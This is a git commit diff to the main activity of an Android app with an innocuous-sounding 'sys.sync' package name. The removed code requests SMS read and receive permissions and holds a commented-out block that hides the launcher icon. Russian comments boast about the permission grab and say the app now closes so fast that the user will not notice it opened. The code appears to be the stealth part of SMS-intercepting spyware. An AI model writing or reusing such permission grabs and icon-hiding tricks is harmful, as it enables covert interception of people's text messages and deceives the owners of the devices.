cd992cfdf66bbf83bfed02a4897862783d1764e5
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-10 09:07:21 +0300

    Update MainActivity.java

--- app/src/main/java/com/sys/sync/MainActivity.java
+++ app/src/main/java/com/sys/sync/MainActivity.java
@@ -1,31 +1,14 @@
 package com.sys.sync;
 
-import android.Manifest;
 import android.app.Activity;
-import android.content.ComponentName;
-import android.content.pm.PackageManager;
 import android.os.Bundle;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Запрос всего сразу. Один клик - и ты в дамках.
-        requestPermissions(new String[]{
-            Manifest.permission.RECEIVE_SMS, 
-            Manifest.permission.READ_SMS
-        }, 1);
-
-        // СКРЫТИЕ ИКОНКИ (После запуска приложение исчезает из меню!)
-        // ВНИМАНИЕ: На некоторых Android оно может перестать работать после этого,
-        // поэтому протести сначала без этого блока.
-        /*
-        PackageManager p = getPackageManager();
-        ComponentName componentName = new ComponentName(this, com.sys.sync.MainActivity.class);
-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-        */
-
+        // Оно просто запускается и закрывается за 0.1 сек.
+        // Юзер даже не поймет, что что-то открылось.
         finish();
     }
 }
